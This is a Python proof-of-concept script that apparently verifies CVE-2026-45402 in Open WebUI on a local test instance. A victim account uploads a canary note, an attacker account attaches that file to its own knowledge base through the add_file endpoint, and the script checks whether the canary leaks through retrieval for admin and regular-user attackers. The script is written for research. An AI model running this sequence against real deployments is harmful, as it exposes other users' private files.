"""Dynamic positive control: CVE-2026-45402 (cross-user file -> RAG) on a running Open WebUI.

The knowledge router's add_file omits a file-ownership check (confirmed statically in
positive_control.md). This script measures whether the resulting cross-user RAG read
reproduces dynamically, for two attacker roles, because process_file() re-fetches the
file scoped by owner for non-admins but globally for admins.

Attack sequence (normal authenticated API calls, local instance only):
  victim B uploads a canary note (embedded into B's own vector collection)
  attacker creates a KB, attaches B's file_id to it  [POST /knowledge/{kb}/file/add]
  attacker queries its own KB

Oracles:
  O-authz  : foreign-file attach returned 200
  O-out    : attacker's answer contains B's canary
  O-prompt : the LLM prompt the attacker triggered (echo log) contains B's canary

Expected (0.8.11): admin/manager attacker -> LEAK; regular user -> blocked downstream.
Usage: owui python positive_control_run.py <base> <echo_log> <out.json>
"""

import importlib.metadata as md
import json
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))
from owui_client import OWUIClient  # noqa: E402

PW = "Passw0rd!123"


def canary(tag):
    return f"{tag}KOALA{abs(hash(tag)) % 90 + 10}"


def read_prompts(path, since):
    p = Path(path)
    if not p.exists():
        return []
    return [json.loads(l) for l in p.read_text(encoding="utf-8").splitlines()
            if l.strip() and json.loads(l).get("ts", 0) >= since]


def trial(base, echo_log, attacker: OWUIClient, victim: OWUIClient, mark: str):
    note = (f"Confidential lecture notes. The secret marker is {mark}. "
            f"Photosynthesis happens in chloroplasts. {mark} recurs in every chunk. " * 5)
    fid = victim.upload_text(f"victim_{mark}.txt", note)
    victim.wait_processed(fid)
    kb = attacker.create_kb(f"kb_{mark}")
    t0 = time.time()
    attach = attacker.add_file_to_kb(kb, fid)
    ask = attacker.ask(f"What is the secret marker in these notes?", kb_id=kb)
    try:
        answer = ask.json()["choices"][0]["message"]["content"]
    except Exception:
        answer = ask.text
    prompts = read_prompts(echo_log, t0)
    o_authz = attach.status_code == 200
    o_out = mark in (answer or "")
    o_prompt = any(mark in (p.get("prompt") or "") for p in prompts)
    return {"victim_file_id": fid, "attach_status": attach.status_code,
            "O_authz_attach_succeeded": o_authz, "O_out_canary_in_answer": o_out,
            "O_prompt_canary_in_prompt": o_prompt, "n_prompts": len(prompts),
            "answer_excerpt": (answer or "")[:160],
            "VERDICT": "LEAK" if (o_out or o_prompt) else ("AUTHZ_ONLY" if o_authz else "NO_LEAK")}


def main():
    base, echo_log, out_path = sys.argv[1], sys.argv[2], sys.argv[3]
    try:
        version = md.version("open-webui")
    except Exception:
        import os as _os
        version = _os.environ.get("OWUI_VERSION", "docker")
    # fresh accounts: first signup becomes admin; others created by admin
    root = OWUIClient(base).signup("Root Admin", "root@test.local", PW)
    for name, email in [("Attacker A", "atk@test.local"), ("Victim B", "vic@test.local")]:
        try:
            root.admin_add_user(name, email, PW, role="user")
        except Exception:
            pass
    A = OWUIClient(base).signin("atk@test.local", PW)
    B = OWUIClient(base).signin("vic@test.local", PW)

    res = {"app": "open-webui", "version": version, "cve": "CVE-2026-45402", "class": "D5",
           "oracle_leak_path": "RAG retrieval (derived vector collection) -> LLM prompt",
           "trials": {}}
    # attacker = manager/admin  (process_file uses global get_file_by_id)
    res["trials"]["admin_attacker"] = trial(base, echo_log, root, B, "ADMINA")
    # attacker = regular user    (process_file re-scopes by owner -> downstream defense)
    res["trials"]["regular_attacker"] = trial(base, echo_log, A, B, "REGUSER")

    res["summary"] = {
        "static_missing_file_ownership_check": True,
        "dynamic_leak_admin_attacker": res["trials"]["admin_attacker"]["VERDICT"] == "LEAK",
        "dynamic_leak_regular_attacker": res["trials"]["regular_attacker"]["VERDICT"] == "LEAK",
        "downstream_defense_for_regular_users": "process_file uses get_file_by_id_and_user_id for non-admins",
    }
    Path(out_path).write_text(json.dumps(res, indent=2), encoding="utf-8")
    print(json.dumps({"version": version, **res["summary"],
                      "admin_verdict": res["trials"]["admin_attacker"]["VERDICT"],
                      "regular_verdict": res["trials"]["regular_attacker"]["VERDICT"]}, indent=2))
    ok = res["summary"]["dynamic_leak_admin_attacker"] and not res["summary"]["dynamic_leak_regular_attacker"]
    sys.exit(0 if ok else 2)


if __name__ == "__main__":
    main()
